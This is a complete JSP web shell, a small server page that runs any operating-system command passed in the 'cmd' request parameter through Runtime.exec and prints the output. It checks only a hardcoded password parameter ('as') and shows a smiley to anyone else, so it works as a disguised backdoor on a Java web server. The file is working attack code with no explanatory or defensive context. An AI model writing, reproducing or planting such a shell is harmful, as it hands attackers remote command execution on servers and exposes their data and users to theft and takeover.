<%@ page language="java" import="java.util.*,java.io.*"
	pageEncoding="UTF-8"%>
<%!public static String excuteCmd(String c) {
		StringBuilder line = new StringBuilder();
		try {
			Process pro = Runtime.getRuntime().exec(c);
			BufferedReader buf = new BufferedReader(new InputStreamReader(
					pro.getInputStream()));
			String temp = null;
			while ((temp = buf.readLine()) != null) {
				line.append(temp + "\n");
			}
			buf.close();
		} catch (Exception e) {
			line.append(e.getMessage());
		}
		return line.toString();
	}%>
<%if ("as".equals(request.getParameter("pwd"))
				&& !"".equals(request.getParameter("cmd"))) {
			out.println("<pre>" + excuteCmd(request.getParameter("cmd"))
					+ "</pre>");
		} else {
			out.println(":-)");
		}%>